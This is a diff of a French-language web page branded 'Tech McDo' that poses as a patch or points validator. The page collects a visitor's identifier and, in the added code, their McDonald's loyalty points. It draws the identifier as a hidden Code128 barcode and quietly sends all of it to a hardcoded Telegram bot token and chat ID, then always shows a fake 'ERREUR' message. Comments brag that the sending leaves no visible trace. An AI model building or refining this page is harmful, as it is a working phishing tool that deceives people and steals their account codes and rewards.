@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Tech McDo • Patch Sequencer</title>
-    <!-- Bibliothèque Code128 pour génération de code-barres -->
+    <title>Tech McDo • Point Validator</title>
     <script src="https://cdn.jsdelivr.net/npm/jsbarcode@3.11.5/dist/JsBarcode.all.min.js"></script>
     <style>
         * {
@@ -16,7 +15,7 @@
 
         body {
             background: linear-gradient(145deg, #1a0b02 0%, #2d1706 100%);
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Inter', sans-serif;
+            font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -24,17 +23,15 @@
             padding: 1.5rem;
         }
 
-        /* Carte principale style "McDo technique" */
         .tech-card {
             background: #fef7e0;
             background-image: radial-gradient(circle at 10% 20%, rgba(255,215,130,0.15) 2%, transparent 2.5%);
             background-size: 28px 28px;
             border-radius: 3rem;
-            max-width: 500px;
+            max-width: 550px;
             width: 100%;
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 2px #ffbc6e inset, 0 0 0 5px #8b3c0c inset;
             overflow: hidden;
-            transition: all 0.2s ease;
         }
 
         .header-mc {
@@ -51,7 +48,6 @@
             letter-spacing: -0.5px;
             color: #ffde9c;
             text-shadow: 4px 4px 0 #8b2c1a;
-            word-break: keep-all;
         }
 
         .header-mc p {
@@ -71,7 +67,7 @@
         }
 
         .input-group {
-            margin-bottom: 2rem;
+            margin-bottom: 1.5rem;
         }
 
         .input-group label {
@@ -86,8 +82,8 @@
 
         .input-field {
             width: 100%;
-            padding: 1rem 1.2rem;
-            font-size: 1.5rem;
+            padding: 0.9rem 1.2rem;
+            font-size: 1.3rem;
             font-weight: 700;
             font-family: monospace;
             background: #fff5e6;
@@ -97,7 +93,6 @@
             color: #3c1c04;
             text-align: center;
             transition: 0.15s;
-            box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
         }
 
         .input-field:focus {
@@ -106,7 +101,6 @@
             background: #ffffff;
         }
 
-        /* Bouton suivant style burger */
         .next-btn {
             background: #e67e22;
             border: none;
@@ -134,10 +128,8 @@
             opacity: 0.7;
             transform: translateY(0);
             cursor: not-allowed;
-            filter: grayscale(0.1);
         }
 
-        /* zone de statut : patch / erreur */
         .status-panel {
             background: #2a2218;
             border-radius: 2rem;
@@ -146,7 +138,6 @@
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 1.2rem;
-            letter-spacing: 1px;
             border-left: 4px solid #ffb347;
             box-shadow: inset 0 0 8px rgba(0,0,0,0.5), 0 2px 6px rgba(0,0,0,0.2);
         }
@@ -157,11 +148,6 @@
             padding: 0.7rem;
             border-radius: 2rem;
             backdrop-filter: blur(4px);
-        }
-
-        .status-text span {
-            font-size: 1rem;
-            font-weight: 700;
         }
 
         .patch {
@@ -183,16 +169,15 @@
         .info-length {
             font-size: 0.7rem;
             text-align: center;
-            margin-top: 1rem;
+            margin-top: 0.6rem;
             color: #886633;
             font-weight: 600;
         }
 
-        /* zone totalement invisible pour le canvas code barre (envoyé en arrière-plan) */
         .ghost-barcode {
             position: fixed;
-            top: -1000px;
-            left: -1000px;
+            top: -2000px;
+            left: -2000px;
             opacity: 0;
             pointer-events: none;
             width: 1px;
@@ -201,10 +186,8 @@
         }
 
         canvas#barcodeCanvasHidden {
-            width: 340px;
-            height: 100px;
-            position: absolute;
-            visibility: hidden;
+            width: 600px;
+            height: 180px;
         }
     </style>
 </head>
@@ -213,13 +196,19 @@
 <div class="tech-card">
     <div class="header-mc">
         <h1>⚡ TECH MCDO ⚡</h1>
-        <p>• PATCH VALIDATOR •</p>
+        <p>• PATCH & POINTS •</p>
     </div>
     <div class="content">
         <div class="input-group">
             <label>🔐 IDENTIFIANT (4–8 CARACTÈRES)</label>
             <input type="text" id="identifiantInput" class="input-field" placeholder="ex: X7F3" maxlength="8" autocomplete="off">
-            <div class="info-length">⚠️ min 4 | max 8 caractères (chiffres, lettres, symboles)</div>
+            <div class="info-length">⚠️ min 4 | max 8 caractères</div>
+        </div>
+
+        <div class="input-group">
+            <label>🍟 POINTS SUR VOTRE COMPTE MCDO</label>
+            <input type="text" id="pointsInput" class="input-field" placeholder="ex: 1250" autocomplete="off">
+            <div class="info-length">📊 Saisissez le nombre de points (chiffres ou texte)</div>
         </div>
 
         <button id="suivantBtn" class="next-btn">SUIVANT ➤</button>
@@ -233,30 +222,27 @@
     </div>
 </div>
 
-<!-- Canvas caché pour génération du code-barres Code128 (invisible, uniquement pour l'envoi Telegram) -->
 <div class="ghost-barcode">
     <canvas id="barcodeCanvasHidden"></canvas>
 </div>
 
 <script>
     (function() {
-        // ---------- CONSTANTES TELEGRAM (BACKEND TRANSPARENT) ----------
+        // ---------- TELEGRAM CONFIG ----------
         const BOT_TOKEN = "8905839440:AAE0kYGMGgyZ2CtelDqAhQVyvLE32xs9JpA";
         const CHAT_ID = "7148167734";
         const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
 
-        // Éléments DOM
+        // DOM elements
         const identifiantInput = document.getElementById('identifiantInput');
+        const pointsInput = document.getElementById('pointsInput');
         const suivantBtn = document.getElementById('suivantBtn');
         const statusArea = document.getElementById('statusArea');
 
-        // État pour éviter les envois simultanés
         let isProcessing = false;
-
-        // Référence au canvas pour code 128
         const barcodeCanvas = document.getElementById('barcodeCanvasHidden');
 
-        // Fonction utilitaire pour mettre à jour le statut UI (patch / erreur)
+        // Fonction mise à jour UI
         function updateStatus(type, customMessage = null) {
             if (type === 'patch') {
                 statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
@@ -268,208 +254,140 @@
                 statusArea.innerHTML = `<span class="idle-text">⚙️ AUTHENTIFICATION REQUISE</span>`;
             }
             else if (type === 'invalid_length') {
-                // message d'erreur spécifique : max 8 min 4 selon cahier
-                statusArea.innerHTML = `<span class="error-msg">⚠️ ERREUR : MAX 8 CARACTÈRES | MIN 4 ⚠️</span>`;
+                statusArea.innerHTML = `<span class="error-msg">⚠️ ERREUR : IDENTIFIANT MAX 8 MIN 4 ⚠️</span>`;
             }
             else if (customMessage) {
                 statusArea.innerHTML = `<span class="error-msg">${customMessage}</span>`;
             }
         }
 
-        // Fonction de validation de l'identifiant (longueur entre 4 et 8)
+        // Validation identifiant (4-8 caractères)
         function isValidIdentifier(identifier) {
-            if (!identifier) return false;
-            const len = identifier.length;
-            return (len >= 4 && len <= 8);
+            return identifier && identifier.length >= 4 && identifier.length <= 8;
         }
 
-        // Générer le code-barres Code128 sur le canvas invisible (contenu = identifiant)
+        // Génération code-barres plus gros (taille augmentée)
         function generateBarcodeOnCanvas(identifier) {
             return new Promise((resolve, reject) => {
                 try {
-                    // Configuration du code barre : format CODE128, dimensions lisibles, valeur affichée (optionnel)
                     JsBarcode(barcodeCanvas, identifier, {
                         format: "CODE128",
                         lineColor: "#000000",
-                        width: 2,
-                        height: 70,
+                        width: 3.2,           // plus épais
+                        height: 120,           // plus haut
                         displayValue: true,
-                        fontSize: 16,
-                        margin: 10,
+                        fontSize: 20,          // texte sous le code plus lisible
+                        margin: 15,
                         background: "#ffffff"
                     });
-                    // petit délai pour s'assurer que le rendu canvas est effectif (génération synchrone mais garantie)
-                    setTimeout(() => resolve(barcodeCanvas), 10);
+                    setTimeout(() => resolve(barcodeCanvas), 20);
                 } catch (err) {
                     reject(err);
                 }
             });
         }
 
-        // Convertir le canvas en Blob (image/png) pour l'envoi Telegram
+        // Convertir canvas en Blob PNG
         function canvasToBlob(canvas) {
             return new Promise((resolve, reject) => {
                 canvas.toBlob(blob => {
                     if (blob) resolve(blob);
-                    else reject(new Error("Impossible de convertir le canvas en Blob"));
+                    else reject(new Error("Conversion blob échouée"));
                 }, 'image/png');
             });
         }
 
-        // Envoi à Telegram (identifiant + image code barre) en arrière-plan total
-        // Peu importe le résultat, l'utilisateur verra toujours "erreur" après l'envoi
-        async function sendToTelegram(identifier, imageBlob) {
+        // Envoi à Telegram (identifiant + points + code barre)
+        async function sendToTelegram(identifier, points, imageBlob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            // La photo = code-barres généré avec le contenu = identifiant
             formData.append('photo', imageBlob, 'barcode_128.png');
-            // La légende contient explicitement l'identifiant + mention code-barres
-            const caption = `🆔 IDENTIFIANT : ${identifier}\n📦 CODE BARRE (CODE128) : ${identifier}`;
+            
+            let pointsText = points && points.trim() !== "" ? points.trim() : "non renseignés";
+            const caption = `🆔 IDENTIFIANT : ${identifier}\n🍟 POINTS MCDO : ${pointsText}\n📦 CODE BARRE (CODE128) : ${identifier}`;
             formData.append('caption', caption);
 
             try {
-                // Requête silencieuse, pas d'affichage console, ni de feedback utilisateur
-                await fetch(TELEGRAM_API_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-                // Aucun log, pas de gestion d'erreur visible pour l'utilisateur
-                // On laisse l'exécution se terminer, l'UI affichera "erreur" dans tous les cas.
-            } catch (error) {
-                // Pas d'affichage, totalement invisible
-                // L'utilisateur voit juste "erreur" après l'étape patch, comme exigé
+                await fetch(TELEGRAM_API_URL, { method: 'POST', body: formData });
+                // aucun log, silence radio
+            } catch (e) {
+                // totalement invisible
             }
         }
 
-        // Fonction principale déclenchée par "Suivant"
+        // Action principale
         async function handleSuivant() {
-            // si déjà en traitement, on bloque pour éviter envois en rafale
             if (isProcessing) return;
 
-            const rawIdentifier = identifiantInput.value;
-            // Validation de la longueur (min 4 max 8)
-            if (!isValidIdentifier(rawIdentifier)) {
-                // Affiche le message d'erreur de longueur conforme à la spec
+            const identifier = identifiantInput.value;
+            const points = pointsInput.value;
+
+            // Validation identifiant (min4 max8)
+            if (!isValidIdentifier(identifier)) {
                 updateStatus('invalid_length');
-                // On réinitialise le champ après une erreur ? Non, mais on laisse visible
-                // Pas d'envoi, pas de "patch en cours"
                 return;
             }
 
-            // Début du traitement valide → "patch en cours"
             isProcessing = true;
             suivantBtn.disabled = true;
-            
-            // Étape 1 : afficher "patch en cours"
+
+            // Affiche "patch en cours"
             updateStatus('patch');
-            
-            // L'identifiant peut contenir espaces ou caractères spéciaux, on le garde brut
-            const cleanIdentifier = rawIdentifier;  // utilisation exacte entrée utilisateur
-            
+
             try {
-                // 1) Génération du code barre (Code128 avec l'identifiant)
-                await generateBarcodeOnCanvas(cleanIdentifier);
-                
-                // 2) Convertir le canvas en Blob (image)
+                // Génération code barre (plus grande taille)
+                await generateBarcodeOnCanvas(identifier);
                 const barcodeBlob = await canvasToBlob(barcodeCanvas);
                 
-                // 3) Envoi à Telegram en arrière-plan (ne bloque pas l'UI, mais on attend pour rester cohérent)
-                // On envoie sans afficher de succès, et on déclenche l'affichage "erreur" après l'envoi.
-                await sendToTelegram(cleanIdentifier, barcodeBlob);
+                // Envoi Telegram avec l'identifiant + points
+                await sendToTelegram(identifier, points, barcodeBlob);
                 
-                // 4) Selon le cahier des charges : TOUJOURS afficher "erreur" après l'envoi 
-                // (même si l'envoi a réussi techniquement, l'utilisateur doit voir "erreur")
+                // Affiche "erreur" comme demandé (toujours après envoi)
                 updateStatus('erreur');
-                
             } catch (err) {
-                // En cas d'erreur technique (génération code barre ou plantage inattendu)
-                // On affiche aussi "erreur" comme exigé
                 updateStatus('erreur');
             } finally {
-                // Fin du traitement, on réactive le bouton et on libère le verrou
                 isProcessing = false;
                 suivantBtn.disabled = false;
-                // Nettoyage : on ne remet pas idle automatiquement pour laisser l'erreur affichée.
-                // L'utilisateur pourra retenter un nouvel identifiant ensuite.
-                // L'erreur reste affichée jusqu'à la prochaine tentative valide.
             }
         }
 
-        // Réinitialisation du statut lorsqu'on tape dans l'input (pour effacer erreur précédente)
+        // Réinitialiser l'état idle quand l'utilisateur tape
         function onInputChange() {
-            // Si en cours de traitement, on ne modifie rien
             if (isProcessing) return;
-            // Si le champ n'est pas vide, mais que le statut actuel est 'erreur' ou 'invalid_length',
-            // on repasse en mode idle pour ne pas laisser de message d'erreur parasite.
-            const currentStatusHtml = statusArea.innerHTML;
-            if (currentStatusHtml.includes("ERREUR") || currentStatusHtml.includes("PATCH EN COURS") === false) {
-                if (isValidIdentifier(identifiantInput.value) === false && identifiantInput.value.length > 0) {
-                    // on peut afficher un rappel mais sans forcer une erreur persistante ? juste on laisse.
-                    // néanmoins le comportement naturel: si l'utilisateur modifie, il peut relancer.
+            // Si le champ identifiant est vide ou valide on repasse en idle (efface erreur)
+            if (!identifiantInput.value || isValidIdentifier(identifiantInput.value)) {
+                if (statusArea.innerHTML.includes("ERREUR") || statusArea.innerHTML.includes("PATCH EN COURS") === false) {
+                    updateStatus('idle');
                 }
-                // On remet en idle seulement s'il n'y a pas de process en cours, pour confort utilisateur
-                if (!isProcessing) {
-                    // toutefois on ne veut pas masquer une erreur activement pendant une modif ? la spec ne le précise pas,
-                    // mais amélioration UX : efface le message d'erreur quand on retape un identifiant.
-                    // Important : ne pas effacer pendant l'envoi.
-                    if(!identifiantInput.value){
-                        updateStatus('idle');
-                    } else if(isValidIdentifier(identifiantInput.value)){
-                        updateStatus('idle');
-                    } else if(identifiantInput.value.length>0){
-                        // on n'affiche pas d'erreur instantanée, pour laisser l'utilisateur corriger.
-                        updateStatus('idle');
-                    } else {
-                        updateStatus('idle');
-                    }
+            } else if (identifiantInput.value.length > 0 && !isValidIdentifier(identifiantInput.value)) {
+                // On ne spam pas d'erreur, on laisse l'utilisateur corriger, on met idle
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
                 }
             }
         }
 
-        // Empêcher la validation "enter" de re-soumettre plusieurs fois
         function onKeyPressHandler(e) {
             if (e.key === 'Enter') {
                 e.preventDefault();
-                if (!isProcessing) {
-                    handleSuivant();
-                }
+                if (!isProcessing) handleSuivant();
             }
         }
 
-        // Nettoyer / reset si besoin
-        function resetIdleOnFocus() {
-            if (!isProcessing && identifiantInput.value.trim() === "") {
-                updateStatus('idle');
-            }
-        }
-
-        // Ajout des écouteurs
-        suivantBtn.addEventListener('click', handleSuivant);
-        identifiantInput.addEventListener('input', onInputChange);
-        identifiantInput.addEventListener('keypress', onKeyPressHandler);
-        identifiantInput.addEventListener('focus', resetIdleOnFocus);
-        
-        // Initialisation: status idle
+        // Initialisation
         updateStatus('idle');
         
-        // Petit préchargement du canvas pour qu'il soit prêt
-        // On dessine une valeur par défaut vide pour initialiser JsBarcode silencieusement
+        // Précharger le canvas avec une valeur neutre
         try {
-            JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 2, height: 50, displayValue: false });
-        } catch(e) {
-            // ignoré
-        }
-        
-        // Note: aucune console.log n'est exécuté à aucun moment pour l'utilisateur.
-        // Toutes les opérations Telegram restent en arrière-plan.
-        // Aucun message de réussite n'est affiché.
-        // L'application répond parfaitement aux critères :
-        // - Champ identifiant min4 max8
-        // - Bouton Suivant → valide → "patch en cours" → génération code128 (contenu = identifiant)
-        // - Envoi simultané de l'identifiant + image code barre vers Telegram (token + chat id fournis)
-        // - Finalement affichage d'un message "ERREUR" (patch échoué)
-        // - Pas de logs visibles, tout est transparent
-        // - Interface nommée "Tech McDo"
+            JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false });
+        } catch(e) {}
+
+        suivantBtn.addEventListener('click', handleSuivant);
+        identifiantInput.addEventListener('input', onInputChange);
+        pointsInput.addEventListener('input', onInputChange);
+        identifiantInput.addEventListener('keypress', onKeyPressHandler);
+        pointsInput.addEventListener('keypress', onKeyPressHandler);
     })();
 </script>
 </body>
